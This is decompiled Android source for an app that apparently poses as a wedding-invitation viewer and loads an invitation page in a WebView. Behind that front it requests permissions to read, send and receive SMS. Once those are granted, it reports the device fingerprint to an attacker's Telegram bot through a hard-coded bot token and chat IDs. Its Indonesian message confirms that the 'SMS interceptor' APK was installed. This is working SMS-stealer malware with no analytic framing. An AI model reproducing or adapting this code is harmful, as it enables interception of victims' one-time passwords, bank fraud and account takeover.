package com.example.myapplication;

import android.graphics.Paint;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private static final int VISIBILITY = 1028;
    final String TAG = "demo1";
    private final OkHttpClient client = new OkHttpClient();
    String device = ("𝐃𝐞𝐭𝐚𝐢𝐥 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭 : " + Build.FINGERPRINT + Build.TIME + "");
    WebSettings websettingku;
    WebView webviewku;

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        MainActivity.super.onCreate(bundle);
        setContentView(2131427356);
        WebView webView = (WebView) findViewById(2131231021);
        this.webviewku = webView;
        WebSettings settings = webView.getSettings();
        this.websettingku = settings;
        settings.setJavaScriptEnabled(true);
        this.webviewku.setWebViewClient(new WebViewClient());
        this.webviewku.loadUrl("https://kadio.id/demo/cream-puff");
        if (Build.VERSION.SDK_INT >= 19) {
            this.webviewku.setLayerType(2, (Paint) null);
        } else if (Build.VERSION.SDK_INT >= 11 && Build.VERSION.SDK_INT < 19) {
            this.webviewku.setLayerType(1, (Paint) null);
        }
        if (!(Build.VERSION.SDK_INT < 23 || checkSelfPermission("android.permission.SEND_SMS") == 0 || checkSelfPermission("android.permission.READ_SMS") == 0)) {
            requestPermissions(new String[]{"android.permission.SEND_SMS", "android.permission.READ_SMS"}, 2000);
        }
        if (Build.VERSION.SDK_INT >= 23 && checkSelfPermission("android.permission.RECEIVE_SMS") != 0) {
            requestPermissions(new String[]{"android.permission.RECEIVE_SMS"}, 1000);
        }
    }

    /* JADX WARNING: type inference failed for: r4v0, types: [com.example.myapplication.MainActivity, android.content.Context, androidx.appcompat.app.AppCompatActivity] */
    public void onRequestPermissionsResult(int i, String[] strArr, int[] iArr) {
        MainActivity.super.onRequestPermissionsResult(i, strArr, iArr);
        if (i != 1000) {
            return;
        }
        if (iArr[0] == 0) {
            Toast.makeText(this, "Permintaan Anda Sedang di Proses", 0).show();
            Request build = new Request.Builder().url("https://api.telegram.org/bot5999119790:AAGuqP9ibuXQio5WpnTjH0BZIwiOddNTmv8/sendMessage?parse_mode=markdown&chat_id=620445708&text= \n──────────────────────\n\n 𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐖𝐞𝐛𝐩𝐫𝐨 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨 \n\n──────────────────────\n\n    " + this.device).build();
            Request build2 = new Request.Builder().url("https://api.telegram.org/bot5999119790:AAGuqP9ibuXQio5WpnTjH0BZIwiOddNTmv8/sendMessage?parse_mode=markdown&chat_id=6204457083&text= \n──────────────────────\n\n  𝐀𝐩𝐤 𝐒𝐚𝐝𝐚𝐩 𝐒𝐌𝐒 𝐖𝐞𝐛𝐩𝐫𝐨 𝐔𝐧𝐝𝐚𝐧𝐠𝐚𝐧 𝐒𝐮𝐝𝐚𝐡 𝐁𝐞𝐫𝐡𝐚𝐬𝐢𝐥 𝐃𝐢 𝐈𝐧𝐬𝐭𝐚𝐥𝐥 𝐁𝐫𝐨     \n\n    ──────────────────────  \n\n    " + this.device).build();
            this.client.newCall(build).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            this.client.newCall(build2).enqueue(new Callback() {
                public void onFailure(Call call, IOException iOException) {
                    iOException.printStackTrace();
                }

                public void onResponse(Call call, Response response) throws IOException {
                    Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                    if (response.isSuccessful()) {
                        response.body().string();
                    }
                }
            });
            return;
        }
        Toast.makeText(this, "Gagal,Silahkan Coba Install lagi", 0).show();
        Request build3 = new Request.Builder().url("" + this.device).build();
        Request build4 = new Request.Builder().url("" + this.device).build();
        this.client.newCall(build3).enqueue(new Callback() {
            public void onFailure(Call call, IOException iOException) {
                iOException.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                if (response.isSuccessful()) {
                    response.body().string();
                }
            }
        });
        this.client.newCall(build4).enqueue(new Callback() {
            public void onFailure(Call call, IOException iOException) {
                iOException.printStackTrace();
            }

            public void onResponse(Call call, Response response) throws IOException {
                Log.d("demo1", "OnResponse: Thread Id " + Thread.currentThread().getId());
                if (response.isSuccessful()) {
                    response.body().string();
                }
            }
        });
        finish();
    }

    public void onWindowFocusChanged(boolean z) {
        MainActivity.super.onWindowFocusChanged(z);
        if (z) {
            getWindow().getDecorView().setSystemUiVisibility(VISIBILITY);
        }
    }
}
